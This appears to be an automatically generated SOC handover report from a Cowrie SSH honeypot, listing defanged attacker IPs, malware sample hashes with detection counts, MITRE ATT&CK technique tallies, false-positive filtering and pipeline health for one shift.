
> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `180.167.207[.]234` | **20** | 2026-05-25 20:11 | 2026-05-25 20:20 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.36.126[.]68` | **20** | 2026-05-25 20:02 | 2026-05-25 20:10 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.44[.]93` | **9** | 2026-05-25 19:50 | 2026-05-25 21:05 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `124.164.251[.]88` | **4** | 2026-05-25 20:37 | 2026-05-25 20:39 | 4m | 0 | `T1592` | 🟢 LOW |
| `184.54.241[.]105` | 1 | 2026-05-25 20:46 | 2026-05-25 20:46 | 3s | 0 | `T1592` | 🟢 LOW |
| `186.38.26[.]5` | 1 | 2026-05-25 19:59 | 2026-05-25 19:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `191.6.25[.]239` | 1 | 2026-05-25 19:52 | 2026-05-25 19:52 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `212.73.148[.]19` | 1 | 2026-05-25 20:26 | 2026-05-25 20:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.154.181[.]71` | 1 | 2026-05-25 20:23 | 2026-05-25 20:24 | 13s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]87` | 1 | 2026-05-25 20:54 | 2026-05-25 20:55 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `218.154.181[.]71` | KR | Korea Telecom | **100** ⚠️ | 29 |
| `184.54.241[.]105` | US | Charter Communications Inc | **100** ⚠️ | 7 |
| `183.36.126[.]68` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `124.164.251[.]88` | CN | China Unicom Shan1xi province network | **100** ⚠️ | 43 |
| `120.48.44[.]93` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `186.38.26[.]5` | AR | C.E.L.Da Cooperativa Electrica Darregueira | **100** ⚠️ | 50 |
| `180.167.207[.]234` | CN | CHINANET SHANGHAI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `71.6.199[.]87` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `212.73.148[.]19` | SG | NL MODAT | **100** ⚠️ | 50 |
| `191.6.25[.]239` | BR | TURBONETT TELECOMUNICACOES LTDA. - ME | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 99 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 51 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 46 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 23 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 23 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 116 cases |
| Tool 34  | Credential Extractor        | ✅ 97 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 17 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (9.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 46 priority case(s) shown individually · 10 recon entry/entries in table (4 group(s) consolidating 53 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-25T21:13:34Z_
